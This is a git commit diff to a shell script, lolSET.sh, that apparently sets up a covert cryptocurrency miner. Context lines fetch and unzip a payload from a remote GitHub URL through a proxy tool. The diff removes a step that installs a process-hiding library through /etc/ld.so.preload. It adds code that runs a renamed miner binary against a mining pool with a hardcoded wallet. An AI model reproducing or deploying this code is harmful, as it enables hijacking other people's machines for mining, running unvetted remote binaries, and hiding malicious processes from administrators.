449cdb0d0201eb2f024d1ae8952519c3d36b2d76
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-08 10:01:30 +0700

    Update lolSET.sh

--- lolSET.sh
+++ lolSET.sh
@@ -43,9 +43,13 @@ chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+POOL=etc.2miners.com:1010
+
+WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-sty)
+
+chmod +x tuyulgpu
+
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
